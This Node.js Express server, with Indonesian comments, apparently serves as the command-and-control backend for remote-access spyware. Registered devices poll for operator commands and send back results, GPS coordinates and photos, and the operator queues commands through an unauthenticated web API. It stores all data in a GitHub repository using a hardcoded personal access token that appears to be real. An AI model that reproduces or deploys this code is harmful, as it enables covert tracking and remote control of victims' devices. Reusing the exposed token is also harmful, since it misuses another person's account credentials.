const express = require('express');
const path = require('path');
const app = express();
const PORT = 3000;

// ======== KONFIGURASI GITHUB ========
const GITHUB_TOKEN = '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'; // GANTI DENGAN TOKEN LO
const OWNER = 'zrilaja';                      // GANTI
const REPO = 'database';                       // GANTI
const BRANCH = 'main';                             // BRANCH
const BASE_URL = `https://api.github.com/repos/${OWNER}/${REPO}/contents`;
const HEADERS = {
    'Authorization': `token ${GITHUB_TOKEN}`,
    'Accept': 'application/vnd.github.v3+json',
    'User-Agent': 'Neskar-Server'
};

// Nama file di repo
const DEVICES_PATH = 'devices.json';
const COMMANDS_PATH = 'commands.json';
const RESULTS_PATH = 'results.json';

// ======== FUNGSI BACA/TULIS GITHUB ========
async function readGitHubFile(filePath) {
    try {
        const url = `${BASE_URL}/${filePath}?ref=${BRANCH}`;
        const res = await fetch(url, { headers: HEADERS });
        if (res.status === 404) return null; // file belum ada
        const data = await res.json();
        const content = Buffer.from(data.content, 'base64').toString('utf-8');
        return JSON.parse(content);
    } catch (e) {
        console.error(`Gagal baca ${filePath}:`, e.message);
        return null;
    }
}

async function writeGitHubFile(filePath, content, message = 'Update via Neskar') {
    try {
        // Cek dulu apakah file sudah ada (untuk dapat sha)
        const url = `${BASE_URL}/${filePath}?ref=${BRANCH}`;
        const getRes = await fetch(url, { headers: HEADERS });
        let sha = null;
        if (getRes.status === 200) {
            const existing = await getRes.json();
            sha = existing.sha;
        }

        const body = {
            message: message,
            content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
            branch: BRANCH
        };
        if (sha) body.sha = sha;

        const putRes = await fetch(url, {
            method: 'PUT',
            headers: HEADERS,
            body: JSON.stringify(body)
        });
        if (!putRes.ok) {
            const err = await putRes.json();
            throw new Error(err.message);
        }
        return true;
    } catch (e) {
        console.error(`Gagal tulis ${filePath}:`, e.message);
        return false;
    }
}

// ======== FUNGSI HELPER UNTUK DATA ========
async function readDevices() {
    const data = await readGitHubFile(DEVICES_PATH);
    return data || {};
}
async function writeDevices(data) {
    return writeGitHubFile(DEVICES_PATH, data, 'Update devices');
}
async function readCommands() {
    const data = await readGitHubFile(COMMANDS_PATH);
    return data || {};
}
async function writeCommands(data) {
    return writeGitHubFile(COMMANDS_PATH, data, 'Update commands');
}
async function readResults() {
    const data = await readGitHubFile(RESULTS_PATH);
    return data || {};
}
async function writeResults(data) {
    return writeGitHubFile(RESULTS_PATH, data, 'Update results');
}

// ======== MIDDLEWARE ========
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname)));

// ======== ENDPOINT ========
app.post('/register', async (req, res) => {
    const { deviceId, info } = req.body;
    let devices = await readDevices();
    if (!devices[deviceId]) {
        devices[deviceId] = {
            info: info,
            lastSeen: new Date().toISOString(),
            firstSeen: new Date().toISOString()
        };
    } else {
        devices[deviceId].lastSeen = new Date().toISOString();
    }
    await writeDevices(devices);
    res.json({ success: true });
});

app.post('/poll', async (req, res) => {
    const { deviceId } = req.body;
    let devices = await readDevices();
    if (devices[deviceId]) {
        devices[deviceId].lastSeen = new Date().toISOString();
        await writeDevices(devices);
    }

    let commands = await readCommands();
    let deviceCmds = commands[deviceId] || [];
    let pending = deviceCmds.filter(c => c.status === 'pending');
    res.json({ success: true, commands: pending.map(c => ({ id: c.id, command: c.command })) });

    // Hapus yang pending
    commands[deviceId] = deviceCmds.filter(c => c.status !== 'pending');
    await writeCommands(commands);
});

app.post('/result', async (req, res) => {
    const { deviceId, command, result, type, lat, lon } = req.body;
    let results = await readResults();
    if (!results[deviceId]) results[deviceId] = [];
    results[deviceId].push({
        timestamp: new Date().toISOString(),
        command: command,
        result: result || (type === 'location' ? `lat:${lat}, lon:${lon}` : ''),
        type: type || 'text'
    });
    await writeResults(results);
    res.json({ success: true });
});

app.post('/upload', async (req, res) => {
    const { deviceId, type, data } = req.body;
    if (type === 'photo') {
        // Simpan foto di folder lokal, bukan di GitHub (karena besar)
        const uploadDir = path.join(__dirname, 'uploads');
        if (!require('fs').existsSync(uploadDir)) require('fs').mkdirSync(uploadDir);
        const filename = `${deviceId}_${Date.now()}.jpg`;
        const filepath = path.join(uploadDir, filename);
        require('fs').writeFileSync(filepath, Buffer.from(data, 'base64'));

        let results = await readResults();
        if (!results[deviceId]) results[deviceId] = [];
        results[deviceId].push({
            timestamp: new Date().toISOString(),
            type: 'photo',
            filename: filename
        });
        await writeResults(results);
    }
    res.json({ success: true });
});

// API untuk web
app.get('/api/devices', async (req, res) => {
    let devices = await readDevices();
    res.json(devices);
});

app.post('/api/send_command', async (req, res) => {
    const { deviceId, command } = req.body;
    let commands = await readCommands();
    if (!commands[deviceId]) commands[deviceId] = [];
    commands[deviceId].push({
        id: Date.now(),
        command: command,
        status: 'pending',
        timestamp: new Date().toISOString()
    });
    await writeCommands(commands);
    res.json({ success: true });
});

app.get('/api/results/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    let results = await readResults();
    res.json(results[deviceId] || []);
});

// Halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server jalan di http://localhost:${PORT}`);
});
